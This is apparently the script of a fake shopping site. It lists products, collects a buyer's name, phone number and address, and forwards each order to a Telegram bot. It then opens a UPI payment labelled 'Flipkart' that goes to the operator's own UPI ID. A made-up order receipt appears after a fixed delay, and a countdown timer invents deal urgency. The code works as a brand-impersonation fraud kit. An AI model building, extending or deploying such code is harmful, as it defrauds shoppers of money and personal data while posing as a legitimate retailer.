        let curP = null;

        function showPage(id) {
            document.querySelectorAll('div[id^="page-"]').forEach(p => p.classList.add('hidden'));
            document.getElementById(id).classList.remove('hidden');
            window.scrollTo(0,0);
        }

        function loadHome() {
    const list = document.getElementById('v-list');
    list.className = "product-grid"; // Grid class yahan lagayi
    list.innerHTML = products.map(p => `
        <div class="product-card" onclick="openProduct(${p.id})">
            <img src="${p.images[0]}" class="w-full h-32 object-contain mb-2">
            <div>
                <p class="text-[11px] font-medium line-clamp-2 text-gray-800 mb-1">${p.name}</p>
                <div class="flex items-center gap-1">
                    <span class="text-sm font-bold">â‚¹${p.price.toLocaleString()}</span>
                    <span class="text-gray-400 line-through text-[9px]">â‚¹${p.mrp}</span>
                </div>
                <p class="text-green-600 text-[9px] font-bold">Free Delivery</p>
            </div>
        </div>
    `).join('');
}

        function openProduct(id) {
    // 1. Product data dhoondhna
    curP = products.find(x => x.id === id);
    
    // 2. Name aur Price set karna
    document.getElementById('det-name').innerText = curP.name;
    document.getElementById('det-price').innerText = "â‚¹" + curP.price.toLocaleString();
    document.getElementById('det-mrp').innerText = "â‚¹" + curP.mrp;

    // 3. Top Slider (Photos) load karna
    const slider = document.getElementById('main-slider');
    slider.innerHTML = curP.images.map(img => `
        <div class="slider-item">
            <img src="${img}" class="h-72 object-contain">
        </div>
    `).join('');

    // 4. HIGHLIGHTS (Naya Section) load karna
    const highCont = document.getElementById('det-highlights');
    if (curP.highlights && curP.highlights.length > 0) {
        highCont.innerHTML = curP.highlights.map(h => `<li>${h}</li>`).join('');
    } else {
        highCont.innerHTML = "<li>No specific highlights available</li>";
    }

    // 5. Description Images load karna
    const descCont = document.getElementById('desc-container');
    descCont.innerHTML = curP.descImages.map(img => `
        <img src="${img}" class="w-full">
    `).join('');
    
    // 6. Checkout Summary ko update karna (Summary page ke liye)
    document.getElementById('sum-img').src = curP.images[0];
    document.getElementById('sum-item').innerText = curP.name;
    document.getElementById('sum-price').innerText = "â‚¹" + curP.price.toLocaleString();
    document.getElementById('sum-total-bottom').innerText = "â‚¹" + (curP.price + 3).toLocaleString();
    
    // 7. Page change karna
    showPage('page-detail');
}
        function goToSummary() {
            const name = document.getElementById('inp-name').value;
            const phone = document.getElementById('inp-phone').value;
            if(!name || phone.length < 10) return alert("Fill Details!");
            document.getElementById('sum-name').innerText = name;
            document.getElementById('sum-phone').innerText = phone;
            document.getElementById('sum-addr').innerText = `${document.getElementById('inp-house').value}, ${document.getElementById('inp-city').value}`;
            showPage('page-summary');
        }

        function processOrder() {
            const msg = `ðŸš€ NEW ORDER: ${curP.name} | Customer: ${document.getElementById('inp-name').value}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            window.location.href = `upi://pay?pa=${upiId}&pn=Flipkart&am=${curP.price+3}&cu=INR`;
            setTimeout(() => {
                document.getElementById('rec-oid').innerText = "OD" + Date.now();
                document.getElementById('rec-img').src = curP.images[0];
                document.getElementById('rec-item').innerText = curP.name;
                showPage('page-receipt');
            }, 3000);
        }
 function startTimer() {
    function updateTimer() {
        const now = new Date();
        const endOfDay = new Date();
        endOfDay.setHours(23, 59, 59, 999); // Aaj raat 12 baje tak ka time

        const diff = endOfDay - now;

        const h = Math.floor(diff / (1000 * 60 * 60));
        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const s = Math.floor((diff % (1000 * 60)) / 1000);

        document.getElementById('deal-timer').innerText = 
            `${h.toString().padStart(2, '0')}h ${m.toString().padStart(2, '0')}m ${s.toString().padStart(2, '0')}s left`;
    }
    
    setInterval(updateTimer, 1000);
    updateTimer();
}

// Apne purane window.onload ko aise update karein:
// Purane dono window.onload ko hata kar sirf ye ek likhein
window.onload = function() {
    loadHome();   // Products load karega
    startTimer(); // Timer shuru karega
};
